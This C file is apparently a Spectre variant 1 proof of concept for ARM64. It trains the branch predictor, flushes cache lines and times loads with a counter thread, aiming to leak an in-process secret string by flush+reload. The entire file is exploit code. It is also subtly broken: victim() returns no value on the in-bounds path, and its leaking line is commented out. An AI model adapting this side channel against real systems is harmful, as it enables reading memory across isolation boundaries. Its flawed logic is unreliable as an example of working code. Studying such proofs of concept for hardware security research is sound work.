#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>


volatile uint64_t counter = 0;
unsigned int buffer_size = 10;
u_int8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
u_int8_t temp = 0;
char*secret = "Some Secret Value";
u_int8_t array[256*4096];
int thresh = 0;

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

void *inc_counter(void *a) {
	while (1) {
		counter++;
		asm volatile ("DMB SY");
	}
}


static u_int64_t timed_read(volatile uint8_t *addr) {
	u_int64_t ns = counter;

	asm volatile (
		"DSB SY\n"
		"LDR X5, [%[ad]]\n"
		"DSB SY\n"
		: : [ad] "r" (addr) : "x5");

	return counter - ns;
}



#define DELTA 1024

void flushSideChannel()
{
  int i;// Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  // Flush the values of the array from cache
  for (i = 0; i < 256; i++) flush(&array[i*4096 +DELTA]);
}

int victim(size_t x){
  if (x < buffer_size){
    //array[buffer[x]*4096 + DELTA] = 10;
    buffer[x];
  } else {
    return 0;
  }
}

void reloadSideChannel(int thresh){
  int junk=0;
  register u_int64_t time;
  volatile u_int8_t*addr;
  int i;
  for(i = 0; i < 256; i++){
    time = timed_read(&array[i*4096 + DELTA]);
    if (time <= thresh){
      printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
      printf("The Secret = %d.\n",i);
    }
  }
}

void spectre(size_t offset){
  int i;
  u_int8_t s;
  //Mistraining the branch predictor using valid values for x
  for(int i=0; i<10; i++){
    victim(i);
  }

  flush(&buffer_size);
  flushSideChannel();

  // Restricted access
  // Secret will be loaded due to speculative attack
  s = victim(offset);
  array[s*4096 + DELTA] += 88; 

  reloadSideChannel(thresh);
}

int main(int argc, const char**argv){
  thresh = atoi(argv[1]);
  printf("%p\n",(void*)&secret);
  printf("%p\n",(void*)&buffer);
  printf("%p\n",(void*)&array);
  pthread_t inc_counter_thread;
	if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
		fprintf(stderr, "Error creating thread\n");
		return 1;
	}
	while (counter < 10000000);
	asm volatile ("DSB SY");


  size_t larger_x = (size_t)(secret - (char*)buffer);
  spectre(larger_x);
  return (0);
}
